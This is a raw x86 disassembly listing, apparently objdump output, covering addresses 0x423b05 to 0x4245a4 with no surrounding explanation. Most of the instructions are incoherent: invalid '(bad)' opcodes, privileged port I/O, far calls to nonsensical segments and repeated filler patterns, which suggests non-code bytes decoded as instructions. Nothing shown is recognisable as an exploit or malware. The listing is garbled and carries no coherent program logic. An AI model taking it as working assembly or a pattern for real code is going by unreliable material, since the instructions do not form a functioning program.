  423b05:	mov    DWORD PTR [ecx],0x42d23e40
  423b0b:	clc    
  423b0c:	outs   dx,BYTE PTR ds:[esi]
  423b0d:	mov    bl,0x3d
  423b0f:	std    
  423b10:	add    edi,eax
  423b12:	add    ah,0x46
  423b15:	aam    0x42
  423b17:	cld    
  423b18:	lds    ebx,FWORD PTR [eax]
  423b1a:	adc    BYTE PTR [ecx-0x4b],dl
  423b1d:	xor    BYTE PTR [edx+edx*2],cl
  423b20:	mov    ch,0x20
  423b22:	or     BYTE PTR [eax-0x27],dl
  423b25:	xor    ah,bh
  423b27:	mov    ebx,ebx
  423b29:	sub    cl,al
  423b2b:	int3   
  423b2c:	cli    
  423b2d:	xchg   edi,eax
  423b2e:	retf   
  423b2f:	int3   
  423b30:	imul   edx,edx,0xffffffeb
  423b33:	mov    eax,ds:0x3f431a
  423b38:	js     0x423b95
  423b3a:	push   0x782f538b
  423b3f:	inc    ecx
  423b40:	ds aam 0x4f
  423b43:	add    esp,ecx
  423b45:	call   0xccc1:0x283b5087
  423b4c:	jp     0x423ae5
  423b4e:	retf   
  423b4f:	int3   
  423b50:	jmp    0x423b23
  423b52:	jmp    0x423ad7
  423b54:	push   0x57
  423b56:	lahf   
  423b57:	push   eax
  423b58:	neg    BYTE PTR [ebx]
  423b5a:	add    BYTE PTR [ebx+0x3ec78a8c],cl
	...
  423b88:	add    BYTE PTR [eax],al
  423b8a:	mov    ch,0x1b
  423b8c:	xor    BYTE PTR [ebx+0x3ed1d26c],cl
  423b92:	lds    edx,FWORD PTR [ebx]
  423b94:	or     al,0x8b
  423b96:	ins    BYTE PTR es:[edi],dx
  423b97:	aam    0x4a
  423b99:	hlt    
  423b9a:	mov    ch,0x20
  423b9c:	hlt    
  423b9d:	mov    eax,DWORD PTR [esi+0x364d8757]
  423ba3:	rcl    BYTE PTR [edx-0x8],cl
  423ba6:	mov    bh,0x2f
  423ba8:	cld    
  423ba9:	mov    eax,0x5b3f
  423bae:	ret    
  423baf:	call   0xf8:0x47bd4473
  423bb6:	xchg   ebx,eax
  423bb7:	pop    edi
  423bb8:	xor    eax,eax
  423bba:	adc    eax,0xf64d8987
  423bbf:	ror    DWORD PTR [esi+0x18],1
  423bc2:	xor    eax,0x47750830
  423bc7:	rol    BYTE PTR [edx-0x8],cl
  423bca:	mov    ch,0x17
  423bcc:	or     al,0x89
  423bce:	xchg   BYTE PTR [edi-0x77],ah
  423bd1:	push   ebp
  423bd2:	(bad)  
  423bd3:	rol    DWORD PTR [edx+0x10],1
  423bd6:	mov    bh,0x18
  423bd8:	sbb    BYTE PTR [eax+0x5b3f],bh
  423bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bdf:	bound  ecx,QWORD PTR [ecx+0xed1b64d]
  423be5:	mov    DWORD PTR [ebx],edx
  423be7:	ret    
  423be8:	mov    BYTE PTR [ebp-0x5a],al
  423beb:	add    DWORD PTR [ebx-0x4],0x0
	...
  423c16:	add    BYTE PTR [eax],al
  423c18:	adc    ebx,DWORD PTR [edi+0x31]
  423c1b:	shl    BYTE PTR [ebp+0x4db3e95e],0x9b
  423c22:	mov    ch,ah
  423c24:	jecxz  0x423bbf
  423c26:	retf   
  423c27:	int3   
  423c28:	mov    dl,BYTE PTR [esi-0x697d3335]
  423c2e:	retf   
  423c2f:	int3   
  423c30:	jp     0x423bc8
  423c32:	retf   
  423c33:	int3   
  423c34:	or     edx,edx
  423c36:	jmp    0x423bbb
  423c38:	push   0x62
  423c3a:	lds    eax,FWORD PTR [ebp+0x56]
  423c3d:	pop    edx
  423c3e:	xor    BYTE PTR [eax],al
  423c40:	xor    eax,DWORD PTR ds:[ebx+eax*1]
  423c44:	(bad)  
  423c45:	pop    edx
  423c46:	lahf   
  423c47:	cmp    al,0xb6
  423c49:	sbb    al,BYTE PTR [eax]
  423c4b:	push   eax
  423c4c:	es sub esp,edi
  423c4f:	jmp    FWORD PTR [ecx]
  423c51:	fld    st(3)
  423c53:	or     BYTE PTR [edi+0x7e6af41e],dh
  423c59:	ror    BYTE PTR [edx-0x8],1
  423c5c:	outs   dx,DWORD PTR ds:[esi]
  423c5d:	rcl    BYTE PTR [edx],1
  423c5f:	sbb    al,0x86
  423c61:	sbb    al,BYTE PTR [eax]
  423c63:	mov    edi,DWORD PTR [ebx+ebp*1+0x50]
  423c67:	push   0x3e
  423c69:	les    edx,FWORD PTR [edx-0xc]
  423c6c:	popf   
  423c6d:	outs   dx,DWORD PTR ds:[esi]
  423c6e:	js     0x423cb1
  423c70:	fdivr  DWORD PTR ds:[edx]
  423c73:	adc    al,0x66
  423c75:	sbb    al,BYTE PTR [eax]
  423c77:	add    BYTE PTR [ebx+0x5c],dl
  423c7a:	mov    eax,0x2
	...
  423ca3:	add    BYTE PTR [eax],al
  423ca5:	add    BYTE PTR [esi],bh
  423ca7:	pop    ebx
  423ca8:	add    bl,ch
  423caa:	push   esp
  423cab:	ror    BYTE PTR [edx],1
  423cad:	add    BYTE PTR [ebx+ebx*1],bh
  423cb0:	add    BYTE PTR [ecx+0x67cb0b],cl
  423cb6:	sub    DWORD PTR [edx+0x0],ebx
  423cb9:	push   0x40593e
  423cbe:	mov    ch,0x6e
  423cc0:	adc    al,0x78
  423cc2:	call   FWORD PTR [edx+0x7f]
  423cc5:	ret    0x593e
  423cc8:	add    BYTE PTR [eax],al
  423cca:	in     al,dx
  423ccb:	mov    dl,0x9d
  423ccd:	inc    BYTE PTR [ecx+0x4ac480c4]
  423cd3:	add    eax,DWORD PTR [eax]
  423cd5:	add    bh,dh
  423cd7:	pop    edx
  423cd8:	sub    eax,DWORD PTR [eax]
  423cda:	cmp    al,0x5b
  423cdc:	add    BYTE PTR [ebx+0x41786f33],cl
  423ce2:	ds jo  0x423cad
  423ce5:	mov    DWORD PTR [ebx+0x1f],eax
  423ce8:	js     0x423d2b
  423cea:	rcl    BYTE PTR ds:[edx],1
  423ced:	inc    esp
  423cee:	(bad)  
  423cef:	sbb    DWORD PTR [eax],eax
  423cf1:	push   edx
  423cf2:	fild   QWORD PTR [esi+0x78]
  423cf5:	inc    ecx
  423cf6:	sub    ecx,DWORD PTR ds:[ecx-0x17d5d1b3]
  423cfd:	popf   
  423cfe:	and    al,ah
  423d00:	cld    
  423d01:	add    DWORD PTR [edx],0x57
  423d04:	mov    DWORD PTR ds:0x3f432a,edx
	...
  423d32:	add    BYTE PTR [eax],al
  423d34:	cmp    eax,0x6b89082e
  423d39:	mov    bl,0x88
  423d3b:	push   ebp
  423d3c:	out    0xc3,al
  423d3e:	loope  0x423ccb
  423d40:	(bad)  ds:0x96faccc1
  423d46:	retf   
  423d47:	int3   
  423d48:	mov    edx,eax
  423d4a:	jmp    0x423cd7
  423d4c:	adc    DWORD PTR [ebx+0x39],0x45
  423d50:	inc    edx
  423d51:	dec    eax
  423d52:	add    eax,0xe953838b
  423d57:	add    eax,0x458957d5
  423d5c:	dec    edx
  423d5d:	es ror esp,0x82
  423d61:	xchg   esi,eax
  423d62:	retf   
  423d63:	int3   
  423d64:	jp     0x423cfc
  423d66:	retf   
  423d67:	int3   
  423d68:	or     edx,eax
  423d6a:	jmp    0x423cef
  423d6c:	stos   BYTE PTR es:[edi],al
  423d6d:	jbe    0x423d34
  423d6f:	inc    ebp
  423d70:	xchg   edx,eax
  423d71:	pop    edx
  423d72:	nop
  423d73:	add    DWORD PTR [esi],edi
  423d75:	rol    BYTE PTR [edx+0x8],1
  423d78:	mov    bh,0x1d
  423d7a:	fmul   DWORD PTR [ebx+0x5588a30b]
  423d80:	inc    esi
  423d81:	pop    eax
  423d82:	dec    edi
  423d83:	cmp    al,0xb7
  423d85:	sub    eax,0xbafb8be0
  423d8a:	or     al,0xb7
  423d8c:	push   es
  423d8d:	outs   dx,DWORD PTR ds:[esi]
  423d8e:	mov    DWORD PTR [ebp+0x5e],edx
  423d91:	aad    0x43
  423d93:	or     ah,BYTE PTR [esi]
  423d95:	rol    BYTE PTR [edx-0x18],cl
	...
  423dc0:	add    BYTE PTR [eax],al
  423dc2:	(bad)  
  423dc3:	outs   dx,BYTE PTR ds:[esi]
  423dc4:	add    DWORD PTR [eax+0x3e],eax
  423dc7:	(bad)  
  423dc8:	or     bh,BYTE PTR [esi+esi*4]
  423dcb:	sbb    al,0x0
  423dcd:	push   ecx
  423dce:	push   ss
  423dcf:	adc    edi,ecx
  423dd1:	jmp    DWORD PTR [ecx]
  423dd3:	ffreep st(3)
  423dd5:	or     bh,al
  423dd7:	sbb    al,dh
  423dd9:	push   0x7e
  423ddb:	xor    eax,DWORD PTR [eax]
  423ddd:	xor    BYTE PTR [esi],bh
  423ddf:	pop    ebx
  423de0:	push   0x5cae00
  423de5:	push   0x3e
  423de7:	ret    0xf052
  423dea:	(bad)  
  423deb:	sbb    ah,ah
  423ded:	mov    edx,DWORD PTR [ebx-0x75bd7745]
  423df3:	sub    ecx,DWORD PTR [ecx-0x76d3b9b3]
  423df9:	push   ebp
  423dfa:	fisubr DWORD PTR ds:0xc2cbc1e8
  423e00:	cld    
  423e01:	cmp    edx,0x4f
  423e04:	lds    eax,FWORD PTR [ebp-0x4e]
  423e07:	pop    ebx
  423e08:	add    BYTE PTR [eax],al
  423e0a:	ds mov dh,0x6
  423e0d:	mov    eax,DWORD PTR [ebx]
  423e0f:	mov    DWORD PTR [eax+0x42d43fc0],0xe010c5f4
  423e19:	bswap  ecx
  423e1b:	sub    al,0x6
  423e1d:	cmp    ebx,esi
  423e1f:	(bad)  
  423e20:	jo     0x423e7b
  423e22:	mov    ch,0x18
  423e24:	call   0x423eac
	...
  423e4d:	add    BYTE PTR [eax],al
  423e4f:	add    dh,dh
  423e51:	data16 add BYTE PTR [ebx+edi*8-0x2b],dh
  423e56:	dec    edx
  423e57:	call   0x528319
  423e5c:	jmp    0x41d6:0x6655897e
  423e63:	adc    ch,al
  423e65:	adc    al,ah
  423e67:	mov    ebp,edi
  423e69:	jle    0x423df6
  423e6b:	inc    esp
  423e6c:	cs ret 0x4d88
  423e70:	push   ds
  423e71:	mov    ss,edx
  423e73:	imul   DWORD PTR [edi+0x1e55897f]
  423e79:	push   edx
  423e7a:	lods   eax,DWORD PTR ds:[esi]
  423e7b:	inc    edx
  423e7c:	bound  ebp,QWORD PTR [ebx]
  423e7e:	mov    DWORD PTR [ebp+0x26],eax
  423e81:	(bad)  
  423e82:	dec    edx
  423e83:	or     BYTE PTR ds:0xb5511413,bh
  423e89:	daa    
  423e8a:	call   0xf9ba1a
  423e8f:	inc    edx
  423e90:	dec    edx
  423e91:	sub    ebp,eax
  423e93:	push   ebp
  423e94:	repz sar esp,0x83
  423e98:	add    cl,BYTE PTR [edi-0x77]
  423e9b:	dec    ebp
  423e9c:	(bad)  
  423e9d:	fnstsw WORD PTR [esi-0x17f038d8]
  423ea3:	jmp    0x423e51
  423ea5:	aad    0x52
  423ea7:	in     al,0x6c
  423ea9:	mov    bl,0xd
  423eab:	cld    
  423eac:	rol    ecx,0x80
  423eaf:	les    eax,FWORD PTR [edx+0x33]
  423eb2:	and    al,0x3
	...
  423edc:	add    BYTE PTR [eax],al
  423ede:	(bad)  
  423edf:	pop    edx
  423ee0:	lahf   
  423ee1:	cmp    al,0x26
  423ee3:	sbb    al,0x0
  423ee5:	push   eax
  423ee6:	xchg   esi,eax
  423ee7:	aad    0xf9
  423ee9:	call   FWORD PTR [ecx-0x38f73c23]
  423eef:	pop    ss
  423ef0:	fadd   QWORD PTR [ebx+0x4178834b]
  423ef6:	ds pop ebx
  423ef8:	jae    0x423f04
  423efa:	lds    ecx,FWORD PTR [edi+0x30]
  423efd:	js     0x423efe
  423eff:	pop    edx
  423f00:	dec    edi
  423f01:	call   DWORD PTR [ebx]
  423f03:	lahf   
  423f04:	cmp    BYTE PTR ds:0x3f4326,0x3e
  423f0b:	dec    eax
  423f0c:	sbb    al,0x6a
  423f0e:	(bad)  
  423f0f:	xor    al,BYTE PTR [eax]
  423f11:	xor    BYTE PTR [esi],bh
  423f13:	pop    ebx
  423f14:	mov    DWORD PTR [ebp+0x42],edx
  423f17:	sub    al,0x89
  423f19:	inc    ebp
  423f1a:	push   ds
  423f1b:	aad    0x47
  423f1d:	xor    al,0x8f
  423f1f:	rcl    BYTE PTR [edx-0x10],0xdd
  423f23:	addr16 js 0x423f67
  423f26:	ds mov ah,0x12
  423f29:	push   0x7e
  423f2b:	xor    eax,DWORD PTR [eax]
  423f2d:	xor    BYTE PTR [esi],bh
  423f2f:	pop    ebx
  423f30:	mov    DWORD PTR [ebp+0xa],edx
  423f33:	cs push 0x0
  423f36:	add    DWORD PTR [edi],esp
  423f38:	lock mov ds:0x3f4352,eax
  423f3e:	mov    ebp,0x78147e
	...
  423f6b:	add    BYTE PTR [edi+0x5b],bh
  423f6e:	add    BYTE PTR [ebp+0x4b],dh
  423f71:	xor    eax,0x8b3e6840
  423f76:	add    BYTE PTR [eax],al
  423f78:	lds    edx,FWORD PTR [esi]
  423f7a:	cld    
  423f7b:	push   eax
  423f7c:	push   esp
  423f7d:	pop    ebx
  423f7e:	std    
  423f7f:	push   ebp
  423f80:	into   
  423f81:	cld    
  423f82:	adc    edi,DWORD PTR [eax-0x1]
  423f85:	pop    edx
  423f86:	mov    DWORD PTR [ebp-0x66],ecx
  423f89:	ror    BYTE PTR [edx-0x28],cl
  423f8c:	mov    ch,0x26
  423f8e:	fmul   DWORD PTR [ebx+0x4200a2fb]
  423f94:	pop    edx
  423f95:	rol    BYTE PTR [edx-0x20],cl
  423f98:	lds    ecx,FWORD PTR [esi]
  423f9a:	cld    
  423f9b:	push   ecx
  423f9c:	mov    ch,0x26
  423f9e:	in     al,0x52
  423fa0:	fbld   TBYTE PTR [edi+0x78]
  423fa3:	inc    ecx
  423fa4:	ds sub ebp,eax
  423fa7:	xchg   ebp,eax
  423fa8:	jb     0x423f6a
  423faa:	cld    
  423fab:	add    DWORD PTR [edx+0x5e4d894f],0xffffffdc
  423fb2:	mov    dh,0xa4
  423fb4:	ds pop ebx
  423fb6:	add    BYTE PTR [eax],al
  423fb8:	retf   0x8984
  423fbb:	push   ebp
  423fbc:	pop    esi
  423fbd:	aam    0x42
  423fbf:	fdivr  DWORD PTR ds:0x3e009fdd
  423fc5:	pop    ebx
  423fc6:	xchg   DWORD PTR [ebp+0x22],eax
  423fc9:	aam    0x4a
  423fcb:	loopne 0x423f82
  423fcd:	gs adc al,0x78
	...
  423ff8:	add    BYTE PTR [eax],al
  423ffa:	jg     0x424057
  423ffc:	sub    DWORD PTR [ecx+0x52],edx
  423fff:	rcl    BYTE PTR [edx],cl
  424001:	inc    esp
  424002:	xchg   esi,eax
  424003:	sbb    al,BYTE PTR [eax]
  424005:	mov    eax,ds:0x3f4382
  42400a:	outs   dx,BYTE PTR ds:[esi]
  42400b:	aam    0xa
  42400d:	adc    al,0x76
  42400f:	sbb    al,BYTE PTR [eax]
  424011:	push   ecx
  424012:	lds    esp,FWORD PTR ds:0x3fd652ec
  424018:	cli    
  424019:	jmp    ecx
  42401b:	fcmovnb st,st(3)
  42401d:	or     al,0xc5
  42401f:	adc    eax,0x67438be0
  424024:	js     0x424067
  424026:	ds pop esp
  424028:	dec    eax
  424029:	sub    BYTE PTR [edi-0x87abb3],dh
  42402f:	pop    edx
  424030:	cmp    DWORD PTR ds:0x3f4376,0x8b2b463e
  42403a:	dec    ebx
  42403b:	addr16 js 0x42407f
  42403e:	ds sub eax,0x1a16549f
  424044:	add    BYTE PTR [eax-0x4b],dl
  424047:	dec    ebp
  424048:	xor    BYTE PTR [eax-0x1],bh
  42404b:	pop    edx
  42404c:	dec    edi
  42404d:	call   0x3eff48
  424052:	mov    ebp,0x538b0b96
  424057:	addr16 js 0x42409b
  42405a:	ds sub eax,0x49e8
	...
  424088:	push   edi
  424089:	mov    edi,0x567a83fc
  42408e:	jmp    0x1c916f4
  424093:	inc    eax
  424094:	ds cli 
  424096:	cmp    edi,DWORD PTR [eax+0x7f]
  424099:	pop    ebx
  42409a:	push   eax
  42409b:	call   0x3f052a
  4240a0:	mov    ebp,0x7b890797
  4240a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240a6:	mov    BYTE PTR ds:0x3f4332,cl
  4240ac:	outs   dx,DWORD PTR ds:[esi]
  4240ad:	rcl    BYTE PTR [edx-0x20],cl
  4240b0:	fbld   TBYTE PTR [edi+0x78]
  4240b3:	inc    ecx
  4240b4:	ds pop edx
  4240b6:	inc    edx
  4240b7:	sub    BYTE PTR [esi+0x76300ad2],cl
  4240bd:	sbb    al,0x0
  4240bf:	push   ecx
  4240c0:	(bad)  
  4240c1:	outs   dx,BYTE PTR ds:[esi]
  4240c2:	cld    
  4240c3:	jmp    ecx
  4240c5:	fcmovb st,st(3)
  4240c7:	or     al,0xc5
  4240c9:	push   0x5b7f7830
  4240ce:	jg     0x424092
  4240d0:	scas   al,BYTE PTR es:[edi]
  4240d1:	dec    eax
  4240d2:	(bad)  
  4240d3:	push   DWORD PTR [edi-0x87a398]
  4240d9:	pop    edx
  4240da:	mov    eax,DWORD PTR [ebp-0x4a]
  4240dd:	sub    ebp,DWORD PTR [edx+0x40]
  4240e0:	adc    al,0x55
  4240e2:	mov    DWORD PTR ds:0x3f4302,ecx
  4240e8:	out    dx,eax
  4240e9:	mov    ebp,0xd452
	...
  424116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424117:	mov    edx,0x389fff8
  42411c:	(bad)  
  42411d:	(bad)  
  42411e:	ds pop ebx
  424120:	mov    ebp,esp
  424122:	sbb    ebx,DWORD PTR [ecx-0x707dfffd]
  424128:	retf   
  424129:	int3   
  42412a:	jp     0x4240bb
  42412c:	retf   
  42412d:	int3   
  42412e:	or     edx,edx
  424130:	jmp    0x4240bd
  424132:	add    edx,DWORD PTR [ebx-0x77]
  424135:	inc    eax
  424136:	push   edx
  424137:	and    cl,al
  424139:	int3   
  42413a:	jp     0x4240cb
  42413c:	retf   
  42413d:	int3   
  42413e:	jmp    0x424111
  424140:	jmp    0x424195
  424142:	nop
  424143:	mov    DWORD PTR es:0x3f435e,edi
  42414a:	mov    ch,0x5f
  42414c:	sub    al,0x78
  42414e:	jg     0x4241ab
  424150:	mov    DWORD PTR ds:0x3f4336,esi
  424156:	jno    0x424175
  424158:	pop    ecx
  424159:	pop    ebp
  42415a:	std    
  42415b:	mov    cs,ebx
  42415d:	int3   
  42415e:	imul   edx,edx,0xffffffeb
  424161:	push   ecx
  424162:	popw   ss
  424164:	add    DWORD PTR [eax+0x3e],eax
  424167:	cld    
  424168:	cmp    edi,DWORD PTR [eax+0x7f]
  42416b:	pop    ebx
  42416c:	push   eax
  42416d:	call   0x3f0404
  424172:	mov    ebp,0x7b890796
  424177:	mov    edi,0x4d88
	...
  4241a4:	ss sub al,0x6a
  4241a7:	add    BYTE PTR [ebp-0x87a799],dh
  4241ad:	pop    edx
  4241ae:	push   edx
  4241af:	dec    DWORD PTR [ebx]
  4241b1:	mov    edi,0x9a0be588
  4241b6:	retf   
  4241b7:	int3   
  4241b8:	or     edx,edx
  4241ba:	jmp    0x42413f
  4241bc:	stos   BYTE PTR es:[edi],al
  4241bd:	jbe    0x424184
  4241bf:	inc    ebp
  4241c0:	xchg   esi,eax
  4241c1:	pop    edx
  4241c2:	add    BYTE PTR [eax],al
  4241c4:	ds xchg esi,eax
  4241c6:	inc    edx
  4241c7:	fadd   QWORD PTR [esi]
  4241c9:	pop    ebx
  4241ca:	add    BYTE PTR [eax],al
  4241cc:	adc    DWORD PTR [edi],0x5b3e01f4
  4241d2:	add    bh,al
  4241d4:	add    edi,DWORD PTR [edi+0x5b3effff]
  4241da:	lds    eax,FWORD PTR [ebp+0x62]
  4241dd:	pop    edx
  4241de:	add    BYTE PTR [eax],al
  4241e0:	ror    BYTE PTR ds:[edx+0x8],cl
  4241e4:	mov    bh,0x4f
  4241e6:	xor    BYTE PTR [eax-0x1],bh
  4241e9:	pop    edx
  4241ea:	call   0xfcff7398
  4241ef:	mov    eax,ds:0x3f436e
  4241f4:	arpl   WORD PTR [esp+edi*8+0xc473e00],di
  4241fb:	mov    DWORD PTR [ebx-0x7d],0x5b3e4178
  424202:	add    BYTE PTR [eax],al
  424204:	ds mov al,0x9
  424207:	mov    DWORD PTR [eax],0x0
	...
  424231:	add    BYTE PTR [ebx],bh
  424233:	cmp    DWORD PTR [eax+0x41],0x3e
  424237:	pop    edx
  424238:	add    BYTE PTR [eax],al
  42423a:	fdivr  DWORD PTR ds:[edx]
  42423d:	xor    BYTE PTR [esi+0x1a],ah
  424240:	add    BYTE PTR [eax],al
  424242:	imul   edx,DWORD PTR [ecx-0x3b],0x5
  424246:	push   ss
  424247:	inc    ebx
  424248:	aas    
  424249:	add    BYTE PTR [esi],bh
  42424b:	pop    ebx
  42424c:	add    BYTE PTR [eax],al
  42424e:	mov    ebp,0x7f78387e
  424253:	pop    ebx
  424254:	add    BYTE PTR [ebp+0x4b],dh
  424257:	xor    DWORD PTR [eax],eax
  424259:	dec    DWORD PTR [ebx+0x5b]
  42425c:	js     0x42429f
  42425e:	ds clc 
  424260:	das    
  424261:	js     0x424262
  424263:	pop    edx
  424264:	mov    DWORD PTR ds:0x3f434e,ecx
  42426a:	(bad)  
  42426b:	push   cs
  42426c:	call   0x78cd75fc
  424271:	inc    ecx
  424272:	rol    BYTE PTR ds:[edx-0x18],1
  424276:	cmp    eax,0xfb893c19
  42427b:	mov    dl,0x88
  42427d:	dec    ebp
  42427e:	push   esi
  42427f:	ror    BYTE PTR [edx],cl
  424281:	sbb    al,0xe6
  424283:	sbb    DWORD PTR [eax],eax
  424285:	push   0x4057ee
  42428a:	push   ecx
  42428b:	data16 add BYTE PTR [eax-0x1],bh
  42428f:	pop    edx
  424290:	mov    eax,ds:0x19c63c
  424295:	mov    DWORD PTR [eax],0x0
	...
  4242bf:	add    BYTE PTR [ebx+0xf],al
  4242c2:	js     0x424305
  4242c4:	ds inc esi
  4242c6:	add    DWORD PTR [eax+0x3e],eax
  4242c9:	xor    esp,DWORD PTR [eax+0x3]
  4242cc:	jle    0x424329
  4242ce:	mov    DWORD PTR ds:0x3f435a,edx
  4242d4:	ins    BYTE PTR es:[edi],dx
  4242d5:	mov    bl,0xc1
  4242d7:	test   DWORD PTR [ecx],0x36c480bc
  4242dd:	clc    
  4242de:	inc    edi
  4242df:	js     0x424360
  4242e1:	pop    ebx
  4242e2:	std    
  4242e3:	adc    eax,0x3f4386
  4242e8:	popf   
  4242e9:	and    bh,BYTE PTR [eax+0x41]
  4242ec:	ds cli 
  4242ee:	dec    ebx
  4242ef:	js     0x424370
  4242f1:	pop    ebx
  4242f2:	push   eax
  4242f3:	call   0x3eff82
  4242f8:	mov    ebp,0x7b890396
  4242fd:	retf   
  4242fe:	mov    BYTE PTR [ebp-0x52],cl
  424301:	sub    eax,ebp
  424303:	aad    0xb0
  424305:	mov    ebx,0x568283fc
  42430a:	mov    eax,ds:0x1a2634
  42430f:	mov    esi,ebx
  424311:	retf   0x6a51
  424314:	ds cli 
  424316:	xor    edi,DWORD PTR [eax-0x1]
  424319:	pop    edx
  42431a:	push   eax
  42431b:	call   0x3f06c2
  424320:	mov    ebp,0x8b0b96
	...
  42434d:	add    BYTE PTR [ebx],al
  42434f:	retf   
  424350:	xchg   BYTE PTR [ebp+0x5e],cl
  424353:	iret   
  424354:	push   edx
  424355:	cld    
  424356:	and    eax,0xf473f026
  42435b:	iret   
  42435c:	inc    edx
  42435d:	loopne 0x42434d
  42435f:	iret   
  424360:	dec    edx
  424361:	fsub   st(7),st
  424363:	mov    dl,0xad
  424365:	sti    
  424366:	inc    ecx
  424367:	mov    ebx,0xfe46c480
  42436c:	aas    
  42436d:	js     0x4243ee
  42436f:	pop    ebx
  424370:	mov    DWORD PTR ds:0x3f337e,edx
  424376:	mov    esp,?
  424378:	dec    ebx
  424379:	js     0x4243fa
  42437b:	pop    ebx
  42437c:	add    DWORD PTR [ebp+0x1a],eax
  42437f:	or     al,0x89
  424381:	or     eax,0x3f3352
  424386:	cmp    eax,0xe651fc28
  42438b:	xchg   edx,eax
  42438c:	idiv   bh
  42438e:	icebp  
  42438f:	faddp  st(3),st
  424391:	or     al,0xb5
  424393:	adc    ah,dh
  424395:	add    ecx,DWORD PTR [ebx-0x1daaff69]
  42439b:	in     al,0x52
  42439d:	in     al,0xc5
  42439f:	and    ah,bh
  4243a1:	add    eax,DWORD PTR [ebx-0x3dba7969]
  4243a7:	out    0x4a,al
  4243a9:	loopne 0x424410
  4243ab:	push   0x5aff7840
  4243b0:	xchg   DWORD PTR [ebp+0x0],ecx
	...
  4243db:	add    BYTE PTR [esi-0x438623a],bl
  4243e1:	mov    dl,0xff
  4243e3:	(bad)  
  4243e4:	ds pop ebx
  4243e6:	jmp    0xf85308f4
  4243eb:	cmp    DWORD PTR [edi+ebx*2-0x79],0x55
  4243f0:	xchg   dh,ah
  4243f2:	inc    edx
  4243f3:	clc    
  4243f4:	xor    eax,0x3673f020
  4243f9:	out    0xa,al
  4243fb:	xor    al,0xe6
  4243fd:	sbb    eax,DWORD PTR [eax]
  4243ff:	add    esi,ebx
  424401:	mov    dl,0x88
  424403:	adc    DWORD PTR ds:0xaa1f810,edi
  424409:	xor    edi,DWORD PTR [edi]
  42440b:	add    BYTE PTR ds:0x2e89f820,bh
  424411:	out    0x4a,al
  424413:	clc    
  424414:	mov    edi,0x3e03e69b
  424419:	pop    ebx
  42441a:	mov    DWORD PTR ds:0x3f3372,edx
  424420:	cmp    eax,0x4433f810
  424425:	cld    
  424426:	xor    edi,DWORD PTR [eax+0x7f]
  424429:	pop    ebx
  42442a:	add    DWORD PTR [ebp+0x6],eax
  42442d:	in     al,0x7
  42442f:	jmp    0x4243fa
  424431:	jecxz  0x42445d
  424433:	and    al,0x76
  424435:	sbb    al,0x0
  424437:	mov    DWORD PTR [ebx],esi
  424439:	jnp    0x4244b3
  42443b:	inc    ecx
  42443c:	outs   dx,BYTE PTR ds:[esi]
  42443e:	(bad)  
  42443f:	mov    DWORD PTR [eax],eax
	...
  424469:	add    BYTE PTR [ebx],ch
  42446b:	push   ebx
  42446c:	js     0x4244af
  42446e:	outs   dx,BYTE PTR ds:[esi]
  424470:	(bad)  
  424471:	mov    DWORD PTR [ebx],esi
  424473:	xchg   DWORD PTR [eax+0x41],edi
  424476:	ds ret 
  424478:	dec    ebp
  424479:	test   ecx,0xe90d8ab9
  42447f:	xor    DWORD PTR [edi],edi
  424481:	add    bh,al
  424483:	daa    
  424484:	clc    
  424485:	mov    ecx,0x405d3e
  42448a:	mov    edi,0x3e01ffc3
  42448f:	pop    ebx
  424490:	mov    DWORD PTR [ebp-0x6a],edx
  424493:	test   edi,ecx
  424495:	mov    DWORD PTR [ebx],esi
  424497:	cmp    DWORD PTR [eax+0x41],0x3e
  42449b:	cld    
  42449c:	daa    
  42449d:	js     0x42449e
  42449f:	pop    edx
  4244a0:	push   eax
  4244a1:	call   0x3ef9e0
  4244a6:	mov    ebp,0x338b039e
  4244ab:	outs   dx,DWORD PTR ds:[esi]
  4244ac:	js     0x4244ef
  4244ae:	ds or  al,0xe8
  4244b1:	aad    0x54
  4244b3:	mov    ecx,0x2f7e85fc
  4244b8:	add    al,0x33
  4244ba:	jle    0x424481
  4244bc:	sub    DWORD PTR [ebx+0x41787f63],ecx
  4244c2:	ds fadd st(3),st
  4244c5:	add    al,0xbd
  4244c7:	jbe    0x424501
  4244c9:	js     0x42454a
  4244cb:	pop    ebx
  4244cc:	add    BYTE PTR [eax+eax*1+0x0],dh
	...
  4244f8:	inc    edi
  4244f9:	cli    
  4244fa:	adc    edi,DWORD PTR [eax+0x7f]
  4244fd:	pop    ebx
  4244fe:	xchg   DWORD PTR [edx+eiz*2+0x5f],eax
  424502:	call   0xfcfb4864
  424507:	mov    edx,DWORD PTR [ebx+0xf]
  42450a:	js     0x42454d
  42450c:	ds or  eax,0xe4fe33c1
  424512:	loop   0x424571
  424514:	std    
  424515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424516:	retf   
  424517:	int3   
  424518:	ds pop ebx
  42451a:	add    BYTE PTR [eax],al
  42451c:	ds pop ebx
  42451e:	add    BYTE PTR [eax],al
  424520:	ds pop ebx
  424522:	add    BYTE PTR [eax],al
  424524:	ds pop ebx
  424526:	add    BYTE PTR [eax],al
  424528:	ds pop ebx
  42452a:	add    BYTE PTR [eax],al
  42452c:	ds pop ebx
  42452e:	add    BYTE PTR [eax],al
  424530:	ds pop ebx
  424532:	add    BYTE PTR [eax],al
  424534:	ds pop ebx
  424536:	add    BYTE PTR [eax],al
  424538:	ds pop ebx
  42453a:	add    BYTE PTR [eax],al
  42453c:	ds pop ebx
  42453e:	add    BYTE PTR [eax],al
  424540:	ds pop ebx
  424542:	add    BYTE PTR [eax],al
  424544:	ds pop ebx
  424546:	add    BYTE PTR [eax],al
  424548:	ds pop ebx
  42454a:	add    BYTE PTR [eax],al
  42454c:	ds pop ebx
  42454e:	add    BYTE PTR [eax],al
  424550:	ds pop ebx
  424552:	add    BYTE PTR [eax],al
  424554:	ds pop ebx
  424556:	add    BYTE PTR [eax],al
  424558:	ds pop ebx
	...
  424586:	ds pop ebx
  424588:	add    BYTE PTR [eax],al
  42458a:	ds pop ebx
  42458c:	add    BYTE PTR [eax],al
  42458e:	ds pop ebx
  424590:	add    BYTE PTR [eax],al
  424592:	ds pop ebx
  424594:	add    BYTE PTR [eax],al
  424596:	ds pop ebx
  424598:	add    BYTE PTR [eax],al
  42459a:	ds pop ebx
  42459c:	add    BYTE PTR [eax],al
  42459e:	ds pop ebx
  4245a0:	add    BYTE PTR [eax],al
  4245a2:	ds pop ebx
  4245a4:	add    BYTE PTR [eax],al
